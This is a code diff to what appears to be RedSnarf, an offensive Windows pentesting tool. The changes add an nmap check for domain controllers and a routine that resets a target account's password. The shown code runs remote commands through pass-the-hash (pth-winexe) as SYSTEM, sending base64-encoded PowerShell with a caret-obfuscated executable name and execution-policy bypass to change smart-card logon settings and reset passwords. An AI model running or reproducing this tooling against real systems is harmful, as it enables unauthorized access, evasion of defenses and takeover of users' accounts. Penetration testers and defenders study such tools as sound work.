@@ -1212,7 +1212,7 @@ def main():
 					print colored ("[+]Found " + find_user + " logged in to "+str(ip),'green')
 
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.2j", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="%prog 0.2k", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150))
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
 p.add_argument("-u", "--username", dest="username", default="Administrator",help="Enter a username")
@@ -1464,17 +1464,21 @@ if edq_scforceoption!='n':
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
-				#Ask if we're a DC and try and change the AD account setting also 
-				response = raw_input("If this is a DC Would you like to turn on SmartCardLogonRequired AD Setting for an account : Y/(N) ")
-				if response in yesanswers:	
-					response = raw_input("Please enter the account name :")
-					print colored("[+]Turning on SmardCardLogonRequired for AD Account "+response+"...",'blue')
-					line="Import-Module ActiveDirectory\n"
-					line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $true\n"
+				#Check to see if it's a DC
+				scanv = subprocess.Popen(["nmap", "-sS", "-p88","--open", str(targets[0])], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
+				if "open" in scanv:
+					print colored("[+]This looks to be a Domain Controller:",'green')
+					print colored("[+]Warning - This will change the users current password:",'red')
+					response = raw_input("Would you like to turn on SmartCardLogonRequired AD Setting for an account : Y/(N) ")
+					if response in yesanswers:	
+						response = raw_input("Please enter the account name :")
+						print colored("[+]Turning on SmardCardLogonRequired for AD Account ",'green')+colored(response,'blue')	
+						line="Import-Module ActiveDirectory\n"
+						line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $true\n"
 					
-					en = b64encode(line.encode('UTF-16LE'))						
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-					print colored("[+]Task Completed for account - "+response+"...",'green')	
+						en = b64encode(line.encode('UTF-16LE'))						
+						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+						print colored("[+]Task Completed for account - ",'green')+colored(response,'blue')		
 				
 				sys.exit()	
 
@@ -1489,17 +1493,23 @@ if edq_scforceoption!='n':
 				proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v \"scforceoption\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 				print proc.communicate()[0]
 
-				#Ask if we're a DC and try and change the AD account setting also 
-				response = raw_input("If this is a DC Would you like to turn off SmartCardLogonRequired AD Setting for an account : Y/(N) ")
-				if response in yesanswers:	
-					response = raw_input("Please enter the account name :")
-					print colored("[+]Turning off SmardCardLogonRequired for AD Account "+response+"...",'blue')
-					line="Import-Module ActiveDirectory\n"
-					line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $false\n"
-					
-					en = b64encode(line.encode('UTF-16LE'))						
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-					print colored("[+]Task Completed for account - "+response+"...",'green')	
+				#Check to see if it's a DC
+				scanv = subprocess.Popen(["nmap", "-sS", "-p88","--open", str(targets[0])], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
+				if "open" in scanv:
+					print colored("[+]This looks to be a Domain Controller:",'green')
+					response = raw_input("Would you like to turn off SmartCardLogonRequired AD Setting for an account : Y/(N) ")
+					if response in yesanswers:	
+						response = raw_input("Please enter the account name :")
+						newpass = raw_input("Please enter a new password for the account :")
+						print colored("[+]Turning off SmardCardLogonRequired for AD Account ",'green')+colored(response,'blue')	
+						line="Import-Module ActiveDirectory\n"
+						line=line+"Set-ADUser "+response+" -SmartcardLogonRequired $false\n"
+						line=line+"Set-ADAccountPassword -Reset -NewPassword (ConvertTo-SecureString -AsPlainText \""+newpass+"\" -Force) -Identity "+response+"\n"
+
+						en = b64encode(line.encode('UTF-16LE'))						
+						os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+						print colored("[+]Task Completed for account - ",'green')+colored(response,'blue')	
+						print colored("[+]Password for account ",'green')+colored(response,'blue')+colored(" has been changed to ",'green')+colored(newpass,'blue')
 
 				sys.exit()	
 	
